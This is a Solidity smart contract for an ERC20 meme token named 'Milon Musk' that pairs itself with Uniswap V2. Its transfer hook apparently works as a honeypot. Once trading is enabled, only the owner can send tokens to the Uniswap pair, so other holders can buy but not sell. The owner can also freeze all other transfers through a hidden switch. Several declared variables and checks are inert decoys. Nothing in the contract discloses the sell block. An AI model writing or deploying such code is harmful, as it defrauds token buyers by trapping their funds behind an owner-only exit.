// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import { IUniswapV2Router02 } from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import { IUniswapV2Factory } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import { IUniswapV2Pair } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

contract MilonMusk is ERC20, Ownable {
    bool public tradeUniswap;
    bool public state;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;
    mapping(address => bool) public blacklists;
    mapping(address => uint256) public addressDeposit;
    uint256 private constant _initialSupply = 420000000000 * 10**18;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    constructor() ERC20("Milon Musk", "MILON") {
        _mint(msg.sender, _initialSupply);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        tradeUniswap = true;
    }

    function setDetail(bool _state, bool _tradeUniswap,address _uniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyOwner {
        state = _state;
        tradeUniswap = _tradeUniswap;
        uniswapV2Pair = _uniswapV2Pair;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }   

    function _beforeTokenTransfer(address from,address to,uint256 amount) override internal virtual {
        if(tradeUniswap && to == uniswapV2Pair){
            require(from == owner() || to == owner(), "trading is not started");
            return;
        }
        
        if (uniswapV2Pair == address(0)) {
            require(from == owner() || to == owner(), "trading is not started");
            return;
        }

        if (state) {
            require(amount >= 0, "require higher amount");
            require(from == owner() || to == owner(), "trading is not started");
            return;
        }
    }

    function burn(uint amount) external {
        _burn(msg.sender, amount);
    }
}